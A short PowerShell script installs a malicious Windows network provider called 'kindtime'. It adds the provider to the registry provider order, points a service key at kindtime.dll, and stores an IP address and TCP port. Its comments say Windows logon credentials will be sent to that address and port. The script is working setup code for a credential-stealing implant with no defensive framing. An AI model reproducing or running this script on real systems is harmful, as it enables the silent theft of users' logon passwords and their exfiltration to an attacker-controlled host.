$path = Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\NetworkProvider\Order" -Name PROVIDERORDER
$UpdatedValue = $Path.PROVIDERORDER + ",kindtime"
Set-ItemProperty -Path $Path.PSPath -Name "PROVIDERORDER" -Value $UpdatedValue

New-Item -Path HKLM:\SYSTEM\CurrentControlSet\Services\kindtime
New-Item -Path HKLM:\SYSTEM\CurrentControlSet\Services\kindtime\NetworkProvider
New-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Services\kindtime\NetworkProvider -Name "Class" -Value 2
New-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Services\kindtime\NetworkProvider -Name "Name" -Value kindtime
New-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Services\kindtime\NetworkProvider -Name "ProviderPath" -PropertyType ExpandString -Value "%SystemRoot%\System32\kindtime.dll"

New-Item -Path HKLM:\Software\wow6432node\kindtime
New-ItemProperty -Path HKLM:\software\wow6432node\kindtime -Name "ipa" -Value "192.168.1.1" -Force # this is the ip the creds will be sent to
New-ItemProperty -Path HKLM:\software\wow6432node\kindtime -Name "pt" -Value 6006 -Force # this is the tcp port the creds will be sent to